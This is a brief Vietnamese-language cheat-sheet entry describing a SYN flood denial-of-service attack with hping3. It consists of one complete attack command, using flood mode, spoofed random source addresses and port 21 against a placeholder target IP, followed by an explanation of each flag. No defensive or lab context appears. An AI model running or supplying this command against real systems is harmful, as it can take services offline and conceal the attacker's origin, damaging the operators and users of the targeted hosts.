**Mô tả:** Tấn công DDoS SYN Flood bằng hping3

**Câu lệnh thực thi:**
```bash
hping3 -c 1000 -d 120 -S -w 64 -p 21 --flood --rand-source <ip-target>
```

- `-c 1000`: Gửi 1000 gói tin. 
- `-d 120`: Kích thước dữ liệu mỗi gói là 120 byte. 
- `-S`: Đặt cờ SYN trong gói tin TCP (mô phỏng kết nối TCP chưa hoàn chỉnh). 
- `-w 64`: Đặt kích thước cửa sổ TCP là 64. 
- `-p 21`: Nhắm đến cổng 21 (dịch vụ FTP). 
- `--flood`: Gửi gói tin nhanh nhất có thể. 
- `--rand-source`: Sử dụng địa chỉ IP nguồn ngẫu nhiên (spoofing). 
- `<ip-target>`: Địa chỉ IP đích của mục tiêu.
